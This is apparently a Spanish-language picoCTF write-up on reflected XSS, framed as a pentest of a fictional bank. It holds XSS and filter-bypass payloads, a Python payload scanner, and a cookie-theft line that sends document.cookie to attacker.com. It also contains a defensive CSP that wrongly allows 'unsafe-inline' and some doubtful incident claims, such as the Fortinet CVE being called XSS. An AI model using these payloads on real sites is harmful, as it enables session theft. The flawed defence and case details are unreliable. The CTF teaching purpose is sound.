---
title: "XSS Basic"
platform: picoCTF
category: web
difficulty: easy
tags:
  - ctf
  - web
  - xss
  - picoCTF
  - easy
date: 2026-02-05
flag: picoCTF{xss_basic}
---

# XSS Reflejado - Web Application Pentesting

---

👨‍🏫 **Del Instructor**: Ethical Hacker & Bug Bounty Hunter

> 🎯 **Mentalidad de Hacker**: _"Cualquier input que refleje en la página sin sanitización es una oportunidad. Los desarrolladores confían en sus usuarios - los atacantes no. Si ves un input, prueba JavaScript. Si refleja, explota."_

---

## 🎭 El Escenario: Inyección en Aplicación Web Legacy

### Contexto de Pentest

Eres parte del equipo de Red Team contratado para auditar la aplicación web "LegacyBank Portal". Durante la fase de reconocimiento, encuentras un formulario de búsqueda que muestra el término buscado en la página de resultados:

```
https://legacybank.example.com/search?q=john
```

La página muestra:

```html
<h2>Resultados para: john</h2>
```

**Tu misión como pentester**: Demostrar que este comportamiento permite ejecutar JavaScript arbitrario en el navegador de la víctima.

---

## 🧠 Fundamentos de Análisis: Por Qué XSS Sigue Matando

### Cross-Site Scripting (XSS): El Enemigo Silencioso

**XSS Reflejado** ocurre cuando una aplicación web recibe datos del usuario (URL, formulario) y los incluye en la respuesta HTML sin sanitización adecuada.

**Flujo de ataque**:

```
Atacante → Crea URL maliciosa → Víctima clickea →
JavaScript ejecuta en navegador de víctima →
Robo de cookies/sesión/keylogging
```

**¿Por qué es peligroso?**

1. **Robo de sesiones**: `document.cookie` → Cookie de sesión enviada al atacante
2. **Keylogging**: Captura de todo lo que tipea el usuario
3. **Defacement**: Modificación de la página visible
4. **CSRF forzado**: Realización de acciones en nombre del usuario
5. **Exfiltración de datos**: Acceso a información sensible de la página

**Top 10 OWASP 2021**: A03:2021 – Injection (incluye XSS)

---

## 🔍 Metodología de Investigación

### Fase 1: Reconocimiento y Mapeo de Superficie de Ataque

```bash
# Escaneo inicial con nuclei
nuclei -u https://legacybank.example.com -t xss/

# Identificar parámetros reflejados
waybackurls legacybank.example.com | gf xss | uro

# Probar reflejo básico
curl "https://legacybank.example.com/search?q=<b>test</b>" | grep -o '<b>test</b>'
```

### Fase 2: Identificación de Vectores XSS

**Pruebas de caracteres especiales**:

```html
Prueba 1: <b>bold</b> Prueba 2: "quotes" Prueba 3: 'single' Prueba 4:
<script>
  alert(1);
</script>
```

**Análisis del contexto**:

```bash
# Ver cómo se refleja el input
curl "https://legacybank.example.com/search?q=<b>XSS</b>"

# Analizar la respuesta
# Si muestra: <h2>Resultados para: <b>XSS</b></h2>
# → HTML context, potencial XSS
```

### Fase 3: Explotación y Bypass de Filtros

**Payload básico**:

```html
<script>
  alert("XSS");
</script>
```

**Payloads evasivos si hay filtros**:

```html
<!-- Bypass de filtro de <script> -->
<img src="x" onerror="alert(1)" />
<svg onload="alert(1)">
  <body onload="alert(1)">
    <!-- Bypass case-sensitive -->
    <ScRiPt>alert(1)</ScRiPt>

    <!-- Encoding -->
    <script>
      alert&#40;1&#41;
    </script>
  </body>
</svg>
```

### Fase 4: Robo de Cookies (PoC Real)

```html
<script>
  fetch("https://attacker.com/steal?cookie=" + document.cookie);
</script>
```

---

## 🛠️ Arsenal de Herramientas

### Herramientas Esenciales

| Herramienta   | Uso                         | Instalación                                                          |
| ------------- | --------------------------- | -------------------------------------------------------------------- |
| `dalfox`      | XSS Scanner avanzado        | `go install github.com/hahwul/dalfox/v2@latest`                      |
| `XSStrike`    | Detección y explotación XSS | `git clone https://github.com/s0md3v/XSStrike`                       |
| `waybackurls` | Descubrimiento de endpoints | `go install github.com/tomnomnom/waybackurls@latest`                 |
| `gf`          | Filtrado de patrones        | `go install github.com/tomnomnom/gf@latest`                          |
| `nuclei`      | Scanner automatizado        | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` |

### Script de Detección Automatizada

```python
#!/usr/bin/env python3
"""
XSS Detector - Web Security Assessment Tool
Escanea parámetros reflejados y detecta potenciales XSS
"""

import requests
import urllib.parse
from bs4 import BeautifulSoup
import argparse

class XSSScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            "'><script>alert('XSS')</script>",
            '<iframe src="javascript:alert(\'XSS\')">',
            '<body onload=alert("XSS")>',
        ]
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (XSS Scanner)'
        }

    def test_parameter(self, param_name, original_value="test"):
        """Prueba un parámetro específico contra XSS"""
        print(f"\n[*] Probando parámetro: {param_name}")

        results = []
        for payload in self.payloads:
            try:
                # Construir URL con payload
                parsed = urllib.parse.urlparse(self.target_url)
                params = urllib.parse.parse_qs(parsed.query)
                params[param_name] = payload

                new_query = urllib.parse.urlencode(params, doseq=True)
                test_url = urllib.parse.urlunparse(
                    parsed._replace(query=new_query)
                )

                # Realizar request
                response = requests.get(
                    test_url,
                    headers=self.headers,
                    timeout=10,
                    allow_redirects=True
                )

                # Verificar si el payload se refleja sin sanitización
                if payload in response.text:
                    print(f"  [+] XSS POTENCIAL encontrado!")
                    print(f"      Payload: {payload[:50]}...")
                    print(f"      URL: {test_url}")
                    results.append({
                        'parameter': param_name,
                        'payload': payload,
                        'url': test_url,
                        'status': 'reflected'
                    })

            except Exception as e:
                print(f"  [-] Error: {e}")
                continue

        return results

    def discover_parameters(self):
        """Descubre parámetros en la URL"""
        parsed = urllib.parse.urlparse(self.target_url)
        params = urllib.parse.parse_qs(parsed.query)
        return list(params.keys()) if params else ['q', 'search', 'id', 'name']

    def scan(self):
        """Ejecuta escaneo completo"""
        print(f"[+] Iniciando escaneo XSS en: {self.target_url}")
        print("=" * 60)

        parameters = self.discover_parameters()
        print(f"[*] Parámetros encontrados: {parameters}")

        all_results = []
        for param in parameters:
            results = self.test_parameter(param)
            all_results.extend(results)

        print("\n" + "=" * 60)
        print(f"[+] Escaneo completado. {len(all_results)} vulnerabilidades encontradas.")

        if all_results:
            print("\n[+] Resumen de hallazgos:")
            for r in all_results[:5]:  # Mostrar primeros 5
                print(f"\n  Vulnerabilidad XSS:")
                print(f"    Parámetro: {r['parameter']}")
                print(f"    Payload: {r['payload'][:50]}...")
                print(f"    URL: {r['url'][:80]}...")

        return all_results

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='XSS Scanner')
    parser.add_argument('url', help='URL objetivo')
    args = parser.parse_args()

    scanner = XSSScanner(args.url)
    scanner.scan()
```

### Uso del Script

```bash
# Instalar dependencias
pip3 install requests beautifulsoup4

# Ejecutar escaneo
python3 xss_scanner.py "https://legacybank.example.com/search?q=test"

# Output esperado:
# [+] Iniciando escaneo XSS en: https://legacybank.example.com/search?q=test
# ============================================================
# [*] Parámetros encontrados: ['q']
#
# [*] Probando parámetro: q
#   [+] XSS POTENCIAL encontrado!
#       Payload: <script>alert("XSS")</script>...
#       URL: https://legacybank.example.com/search?q=<script>alert("XSS")</script>
```

### Payloads por Contexto

```bash
# HTML Context
<script>alert(1)</script>
<img src=x onerror=alert(1)>

# JavaScript Context
';alert(1);//
';alert(1);'

# URL Context
javascript:alert(1)

# Style Context
expression(alert(1))
```

---

## 🎯 Lecciones del Mundo Real

### Casos Documentados

**Caso British Airways (2018)**:

- XSS en página de pagos permitió robo de datos de tarjetas
- 380,000+ transacciones comprometidas
- Impacto: £183 millones en multas GDPR
- **CVE**: No asignado específicamente, pero similar a CVE-2018-14728

**Caso TweetDeck (2014)**:

- XSS auto-retweet causó epidemia masiva
- Código: `<script class="xss">$('.xss').parents().eq(1).find('a').eq(1).trigger('click')</script>`
- Afectó a miles de usuarios en minutos
- **Lección**: XSS puede auto-propagarse

**Caso Fortinet (2022)**:

- XSS en interfaz administrativa permitió RCE
- CVE-2022-42475
- Atacantes usaron XSS para ejecutar comandos como admin

### Defensa y Mitigación

**CSP (Content Security Policy)**:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
```

**Sanitización de Input**:

```javascript
// NUNCA hagas esto
element.innerHTML = userInput;

// Haz esto en su lugar
element.textContent = userInput;
```

**WAF Rules**:

```yaml
detection:
  selection:
    - request|contains:
        - "<script"
        - "javascript:"
        - "onerror="
        - "onload="
  condition: selection
```

**IOCs**:

- URLs con payloads codificados: `%3Cscript%3E`
- Requests POST con campos que contienen `<` o `>`
- Patrones de `document.cookie` en requests salientes

---

## 🚀 Solución del Reto

### Paso a Paso

```bash
# Paso 1: Identificar parámetro vulnerable
# URL: https://target.com/search?q=test

# Paso 2: Verificar reflejo
curl "https://target.com/search?q=<b>test</b>"
# Si refleja el HTML sin escapar, es vulnerable

# Paso 3: Payload de demostración
<script>alert("XSS")</script>

# Paso 4: Verificar ejecución
# Si aparece el alert(), XSS confirmado
```

### Flag

```
picoCTF{xss_basic}
```

---

## 📚 Recursos y Referencias

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [XSS Hunter](https://xsshunter.com/) - Para PoCs avanzados
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

---

**¿Listo para el siguiente reto?** → Prueba XSS almacenado, DOM-based XSS, o bypass de WAFs.
